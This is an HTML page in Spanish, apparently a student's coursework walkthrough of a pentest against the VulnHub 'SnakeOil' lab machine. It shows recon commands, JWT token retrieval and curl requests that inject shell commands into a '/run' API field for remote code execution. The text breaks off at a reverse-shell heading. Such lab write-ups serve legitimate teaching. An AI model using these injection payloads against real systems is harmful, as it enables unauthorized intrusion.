@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Walkthrough: Vulneración SnakeOil // ctOS Database</title>
+
+    <!-- Fuentes de Google -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+
+    <!-- Tailwind CSS por CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        ctosBlue: '#00a8ff',
+                        ctosDark: '#0a0a0c',
+                        ctosGray: 'rgba(20, 20, 25, 0.75)'
+                    },
+                    fontFamily: {
+                        cyber: ['Orbitron', 'sans-serif'],
+                        mono: ['Fira Code', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background-color: #050505; overflow-x: hidden; cursor: crosshair; }
+
+        #matrix-bg {
+            position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: -2; opacity: 0.25;
+        }
+        .vignette {
+            position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            box-shadow: inset 0 0 150px rgba(0,0,0,0.9);
+            z-index: -1; pointer-events: none;
+        }
+        .scanlines {
+            position: fixed; top: 0; left: 0;
+            width: 100vw; height: 100vh; z-index: 9999; pointer-events: none;
+            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.1));
+            background-size: 100% 4px;
+        }
+        .hud-corners { position: relative; }
+        .hud-corners::before, .hud-corners::after {
+            content: ''; position: absolute; width: 15px; height: 15px;
+            border-color: #00a8ff; border-style: solid;
+        }
+        .hud-corners::before { top: -1px; left: -1px; border-width: 2px 0 0 2px; }
+        .hud-corners::after { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; }
+        
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+        .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+    </style>
+</head>
+<body class="font-mono text-gray-300 min-h-screen flex flex-col">
+
+    <!-- Fondo y Overlays -->
+    <canvas id="matrix-bg"></canvas>
+    <div class="vignette"></div>
+    <div class="scanlines"></div>
+
+    <div class="fixed top-2 right-4 z-50 flex items-center gap-2 font-cyber font-bold tracking-widest text-white text-xs opacity-70 pointer-events-none">
+        <span class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></span>
+        <span>REC</span>
+    </div>
+
+    <!-- ENCABEZADO UNIVERSAL ctOS -->
+    <header class="bg-black/95 backdrop-blur-md border-b border-ctosBlue/50 py-3 px-4 md:px-6 sticky top-0 z-50 shadow-[0_4px_20px_rgba(0,168,255,0.15)] w-full group">
+        <div class="max-w-[1800px] mx-auto flex flex-col xl:flex-row items-center justify-between gap-6">
+            <div class="flex items-center gap-4 w-full xl:w-auto justify-center xl:justify-start border-b border-white/10 xl:border-none pb-3 xl:pb-0">
+                <div class="flex-shrink-0 animate-pulse text-ctosBlue drop-shadow-[0_0_8px_rgba(0,168,255,0.8)] group-hover:drop-shadow-[0_0_15px_rgba(0,168,255,1)] transition-all duration-300">
+                    <svg viewBox="0 0 100 100" class="w-10 h-10 md:w-12 md:h-12 fill-current">
+                        <path d="M50 5 L95 25 L85 85 L50 95 L15 85 L5 25 Z" fill="none" stroke="currentColor" stroke-width="4"/>
+                        <path d="M25 35 L50 15 L75 35 L65 70 L50 55 L35 70 Z" fill="currentColor"/>
+                    </svg>
+                </div>
+                <div class="flex flex-col items-start overflow-hidden">
+                    <div class="flex items-center gap-2 md:gap-3 flex-nowrap">
+                        <div class="bg-ctosBlue text-black font-cyber text-[9px] md:text-[10px] font-bold px-1.5 py-0.5 uppercase tracking-widest flex-shrink-0">
+                            SYS_ACTIVE
+                        </div>
+                        <h1 class="font-cyber text-lg md:text-2xl font-bold tracking-widest text-white uppercase whitespace-nowrap flex-shrink-0" id="telemetry-name" data-value="SAMUEL LÓPEZ GÓMEZ">
+                            SAMUEL LÓPEZ GÓMEZ
+                        </h1>
+                    </div>
+                    <div class="text-[9px] md:text-xs text-gray-400 font-mono tracking-widest mt-1 whitespace-nowrap flex items-center gap-2">
+                        <span class="text-ctosBlue font-cyber font-bold tracking-wider">ALIAS: [smrunner]</span>
+                        <span class="text-gray-600">|</span>
+                        <span>CNO IV // PERIODO: AGOSTO - DICIEMBRE 2026 // UPSLP</span>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="flex flex-nowrap items-center justify-start xl:ml-auto gap-3 md:gap-4 text-[10px] md:text-xs font-mono uppercase tracking-widest w-full xl:w-auto max-w-full overflow-x-auto whitespace-nowrap pb-1 xl:pb-0 scrollbar-hide">
+                <a href="index.html" class="text-white hover:text-ctosBlue transition-colors flex-shrink-0">> INICIO</a>
+                <a href="Parcial1.html" class="text-white hover:text-ctosBlue transition-colors flex-shrink-0">> PARCIAL_1</a>
+                <a href="javascript:void(0);" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Acceso Denegado">> PARCIAL_2</a>
+                <a href="javascript:void(0);" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Acceso Denegado">> PARCIAL_3</a>
+                <a href="javascript:void(0);" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Pendiente de Carga">> CERTIFICACIONES</a>
+                <a href="Actividad6.html" class="text-gray-400 hover:text-ctosBlue transition-colors flex-shrink-0">> ROAD_TO_HOF</a>
+                <a href="index.html#contacto" class="text-gray-400 hover:text-ctosBlue transition-colors flex-shrink-0 pr-4 md:pr-6">> CONTACTO</a>
+                <span class="w-4 md:w-8 flex-shrink-0 inline-block"></span>
+            </nav>
+        </div>
+    </header>
+
+    <main class="max-w-5xl w-full mx-auto mt-8 mb-10 p-4 md:p-8 relative z-10 flex-grow">
+        
+        <!-- Botón de regreso -->
+        <div class="mb-6">
+            <a href="Parcial1.html" class="inline-flex items-center gap-2 border border-ctosBlue text-ctosBlue font-bold px-4 py-2 uppercase text-xs hover:bg-ctosBlue hover:text-black transition-colors cursor-crosshair">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+                [ REGRESAR_AL_DIRECTORIO ]
+            </a>
+        </div>
+
+        <div class="bg-ctosGray backdrop-blur-md border border-white/10 p-6 md:p-10 pt-12 md:pt-10 hud-corners shadow-2xl flex flex-col gap-8 relative">
+
+            <!-- TÍTULO PRINCIPAL -->
+            <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                SYS_WALKTHROUGH
+            </div>
+
+            <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-ctosBlue/30 pb-4 pr-10 mb-2">
+                <div class="flex items-center gap-3">
+                    <svg class="w-8 h-8 text-ctosBlue animate-pulse flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                    <div>
+                        <h2 class="text-2xl md:text-3xl font-cyber font-bold text-white uppercase tracking-widest">PR - De la teoría a la práctica</h2>
+                        <p class="text-xs md:text-sm text-ctosBlue mt-1 font-mono uppercase tracking-widest">>> Walkthrough en acción: Vulneración de máquina SnakeOil</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NUEVO MÓDULO: EVIDENCIAS ADJUNTAS (PDF Y VIDEO) -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-2">
+                
+                <!-- Panel 1: Documento PDF -->
+                <div class="border border-ctosBlue/50 bg-ctosBlue/10 p-5 relative group flex flex-col items-start justify-between shadow-[0_0_15px_rgba(0,168,255,0.1)]">
+                    <div class="absolute top-0 right-0 bg-ctosBlue text-black px-2 py-0.5 font-cyber text-[10px] font-bold tracking-widest">
+                        DOC_ATTACHMENT
+                    </div>
+                    <div class="flex items-center gap-4 w-full mb-6 mt-2">
+                        <div class="text-ctosBlue flex-shrink-0 group-hover:scale-110 transition-transform">
+                            <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                        </div>
+                        <div>
+                            <h4 class="text-white font-cyber font-bold uppercase tracking-widest text-sm">Reporte de Auditoría</h4>
+                            <p class="text-gray-400 font-mono text-[10px] mt-1">Documentación detallada // Formato: .pdf</p>
+                        </div>
+                    </div>
+                    <!-- PON AQUÍ EL NOMBRE REAL DE TU PDF EN EL HREF -->
+                    <a href="ProyectoP1.pdf" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center gap-2 border border-ctosBlue text-ctosBlue font-cyber font-bold px-4 py-2.5 text-[10px] md:text-xs uppercase tracking-widest hover:bg-ctosBlue hover:text-black transition-all duration-300 w-full cursor-crosshair">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
+                        [ DESCARGAR_REPORTE ]
+                    </a>
+                </div>
+
+                <!-- Panel 2: Video Tutorial -->
+                <div class="border border-ctosBlue/50 bg-ctosBlue/10 p-5 relative group flex flex-col items-start justify-between shadow-[0_0_15px_rgba(0,168,255,0.1)]">
+                    <div class="absolute top-0 right-0 bg-yellow-500 text-black px-2 py-0.5 font-cyber text-[10px] font-bold tracking-widest">
+                        MEDIA_ATTACHMENT
+                    </div>
+                    <div class="flex items-center gap-4 w-full mb-6 mt-2">
+                        <div class="text-yellow-500 flex-shrink-0 group-hover:scale-110 transition-transform">
+                            <!-- Ícono de Reproducción de Video -->
+                            <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="square" stroke-linejoin="miter" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        </div>
+                        <div>
+                            <h4 class="text-white font-cyber font-bold uppercase tracking-widest text-sm">Video PoC / Tutorial</h4>
+                            <p class="text-yellow-500/80 font-mono text-[10px] mt-1 animate-pulse">[ ESTATUS: PENDIENTE DE CARGA ]</p>
+                        </div>
+                    </div>
+                    <!-- CUANDO TENGAS TU VIDEO, CAMBIA "javascript:void(0);" POR TU ENLACE DE YOUTUBE -->
+                    <a href="javascript:void(0);" onclick="alert('ACCESO DENEGADO: El archivo de video se encuentra en proceso de carga y encriptación. Por favor, intente más tarde.');" class="inline-flex items-center justify-center gap-2 border border-yellow-500 text-yellow-500 font-cyber font-bold px-4 py-2.5 text-[10px] md:text-xs uppercase tracking-widest hover:bg-yellow-500 hover:text-black transition-all duration-300 w-full cursor-pointer">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="square" stroke-linejoin="miter" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        [ REPRODUCIR_VIDEO ]
+                    </a>
+                </div>
+
+            </div>
+
+            <!-- OBJETIVO GENERAL -->
+            <section class="border border-ctosBlue/50 bg-ctosBlue/10 p-6 pt-10 md:pt-6 relative group shadow-[0_0_15px_rgba(0,168,255,0.1)] mt-2">
+                <div class="absolute top-0 right-0 bg-ctosBlue text-black px-2 py-0.5 font-cyber text-[10px] md:text-xs font-bold tracking-widest">
+                    MAIN_OBJECTIVE
+                </div>
+                
+                <h3 class="text-xl font-cyber font-bold text-white uppercase tracking-widest mb-4 flex items-center gap-2">
+                    <span class="text-ctosBlue">></span> Objetivo General
+                </h3>
+                <p class="text-sm md:text-base leading-relaxed text-gray-300 font-mono mb-6">
+                    Demostrar la capacidad de aplicar fundamentos teóricos y metodológicos de seguridad informática mediante la ejecución de una auditoría de penetración (<em>pentesting</em>) estructurada sobre la máquina virtual vulnerable <strong class="text-white">"SnakeOil"</strong>. El proyecto tiene como finalidad documentar, a través de un <em>walkthrough</em> exhaustivo, las fases de reconocimiento, identificación de vectores de ataque en una API REST, explotación de vulnerabilidades de ejecución remota de código (RCE) y escalamiento de privilegios, validando la eficacia de las técnicas empleadas en un entorno de pruebas controlado.
+                </p>
+                
+                <div class="p-3 bg-black/50 border border-ctosBlue/30 text-sm inline-block">
+                    <span class="text-ctosBlue font-bold">URL_TARGET:</span> 
+                    <a href="https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/" target="_blank" class="text-gray-300 hover:text-white underline decoration-ctosBlue decoration-2">https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/</a>
+                </div>
+            </section>
+
+            <!-- OBJETIVOS ESPECÍFICOS -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative group">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    SPECIFIC_GOALS
+                </div>
+                
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest mb-6 border-b border-ctosBlue/30 pb-3 pr-24">
+                    Objetivos Específicos
+                </h3>
+                <ul class="space-y-4 font-mono text-sm md:text-base text-gray-300">
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Configurar un entorno de virtualización aislado (Red NAT) para realizar las pruebas de penetración de forma segura y sin riesgo para infraestructuras externas.</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Utilizar herramientas especializadas de descubrimiento y escaneo (como arp-scan y Nmap) para mapear la superficie de ataque e identificar servicios en ejecución.</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Enumerar y analizar las rutas ocultas de la aplicación web utilizando técnicas de <em>fuzzing</em> para comprender la arquitectura de la API REST subyacente.</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Investigar y evaluar las vulnerabilidades lógicas presentes en la gestión de autenticación (tokens JWT) y ejecución de comandos del servidor.</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Seleccionar y adaptar vectores de explotación para lograr la ejecución remota de código (RCE) y establecer una conexión interactiva bidireccional (<em>Reverse Shell</em>).</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Analizar el código fuente de la aplicación en la fase de post-explotación para identificar malas prácticas en la gestión de secretos (credenciales <em>hardcodeadas</em>).</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Escalar privilegios aprovechando la reutilización de credenciales para obtener acceso administrativo (root) sobre el sistema objetivo.</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p>Registrar y explicar detalladamente cada paso del proceso, incluyendo comandos, resultados teóricos y capturas de pantalla, garantizando la reproducibilidad del ataque.</p>
+                    </li>
+                </ul>
+            </section>
+
+            <!-- FASE 1 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_01
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-6 pr-24">
+                    1. Configuración del Laboratorio
+                </h3>
+                
+                <ul class="space-y-4 font-mono text-sm md:text-base text-gray-300">
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p><strong class="text-white">Máquina Atacante:</strong> Entorno Kali Linux encargado de orquestar el escaneo y la explotación.</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p><strong class="text-white">Máquina Víctima:</strong> Máquina virtual vulnerable "SnakeOil".</p>
+                    </li>
+                    <li class="flex items-start gap-3 bg-black/60 p-3 border border-white/5">
+                        <span class="text-ctosBlue font-bold mt-1">>></span>
+                        <p><strong class="text-white">Configuración de Red:</strong> Conexión mediante red NatNetwork (prefijo 10.0.2.0/24) garantizando el aislamiento del entorno de pruebas frente a redes externas (en lugar de usar el modo solo-anfitrión o red puente).</p>
+                    </li>
+                </ul>
+            </section>
+
+            <!-- FASE 2 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_02
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    2. Descubrimiento de hosts con arp-scan
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Se empleó <code>arp-scan</code> porque opera en la capa 2 (enlace) y funciona aunque el host bloquee ICMP (ping) o TCP en su firewall.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Escaneo de la red local para descubrir la IP de la máquina objetivo</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ sudo arp-scan -l</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Posteriormente se verificó la conectividad con el comando ping; un TTL de 64 confirmó que el objetivo estaba activo y dio una primera pista de que el sistema operativo era Linux.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner">
+                    <div class="text-gray-500 italic mb-2"># Verificación de conectividad mediante paquetes ICMP</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ ping 10.0.2.4</div>
+                </div>
+            </section>
+
+            <!-- FASE 3 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_03
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    3. Reconocimiento de servicios con Nmap
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Se ejecutó un escaneo utilizando <code>-sC</code> para lanzar scripts NSE predeterminados y <code>-sV</code> para la detección de versiones exactas, lo cual es vital para buscar CVEs.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Escaneo de puertos abiertos y versiones de servicios</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ nmap -sC -sV 10.0.2.4</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed">
+                    Se identificaron los puertos 22/tcp (SSH), 80/tcp y 8080/tcp (HTTP nginx 1.14.2).
+                </p>
+            </section>
+
+            <!-- FASE 4 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_04
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    4. Enumeración de directorios con Gobuster
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Gobuster realiza fuerza bruta de rutas usando un diccionario para descubrir áreas ocultas.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Búsqueda de rutas ocultas en la aplicación del puerto 8080 probando extensiones</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ gobuster dir -u http://10.0.2.4:8080 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak,zip,sql,py</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed">
+                    Esto indicó la presencia de una API REST, marcando <code>/run</code> (posible ejecución) y <code>/secret</code> (información protegida) como objetivos prioritarios.
+                </p>
+            </section>
+
+            <!-- FASE 5 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_05
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    5. Análisis de la aplicación: API REST en Flask
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed">
+                    Al tratarse de una API REST, la interacción se realiza mediante datos crudos (JSON) en lugar de formularios HTML.
+                </p>
+            </section>
+
+            <!-- FASE 6 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_06
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    6. Registro de usuario y obtención del token JWT
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Antes de atacar la autenticación, se probó la funcionalidad legítima para registrar una cuenta:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Registro de un nuevo usuario en la API por método POST</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -X POST http://10.0.2.4:8080/registration \<br>    -H "Content-Type: application/json" \<br>    -d '{"username":"sm", "password":"123"}'</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Se realizó el login con el flag <code>-v</code> (verbose) para capturar el <code>access_token</code> de la respuesta HTTP.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner">
+                    <div class="text-gray-500 italic mb-2"># Autenticación para obtener el JWT y ver las cabeceras de respuesta</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -X POST http://10.0.2.4:8080/login \<br>    -H "Content-Type: application/json" \<br>    -d '{"username":"sm","password":"123"}' -v</div>
+                </div>
+            </section>
+
+            <!-- FASE 7 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_07
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    7. Obtención de secret_key (Pivote del ataque)
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Tras probar distintas formas de enviar el token (intentando por cookie y fallando), se descubrió que el endpoint <code>/secret</code> aceptaba el <code>access_token</code> del login mediante la cabecera <code>Authorization: Bearer</code>.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Petición autenticada (exitosa) para extraer el secreto de ejecución</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -s http://10.0.2.4:8080/secret \<br>    -H "Authorization: Bearer [ACCESS_TOKEN_EMITIDO]"</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Respuesta obtenida del servidor:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner">
+                    <div class="text-gray-400">{"ip-address": "", "secret_key": "commandexecutionissecret"}</div>
+                </div>
+            </section>
+
+            <!-- FASE 8 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_08
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    8. Confirmación de ejecución remota en /run
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Se envió una cadena de comandos de prueba al endpoint <code>/run</code> utilizando el secreto obtenido. Se buscaba obtener el máximo de información de una vez.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Prueba de RCE encadenando comandos para ver identidad y arquitectura</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -X POST http://10.0.2.4:8080/run \<br>    -H "Content-Type: application/json" \<br>    -d '{"url":"curl ifconfig.me && id && uname -a", "secret_key":"commandexecutionissecret"}'</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Intentando preparar el entorno para una persistencia SSH, se introdujo un comando directo. Sin embargo, falló porque el servidor anteponía <code>curl</code> a la cadena introducida:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner">
+                    <div class="text-gray-500 italic mb-2"># Comando directo fallido; el servidor antepone 'curl' volviéndolo argumentos inválidos</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -X POST http://10.0.2.4:8080/run \<br>    -H "Content-Type: application/json" \<br>    -d '{"url":"mkdir -p /home/patrick/.ssh", "secret_key":"commandexecutionissecret"}'</div>
+                </div>
+            </section>
+
+            <!-- FASE 9 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_09
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    9. Reverse shell hacia Kali
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Al entender cómo la API ejecutaba comandos, se optó por forzarla a descargar un script malicioso. Primero se creó localmente usando <em>heredoc</em>:
+                </p>
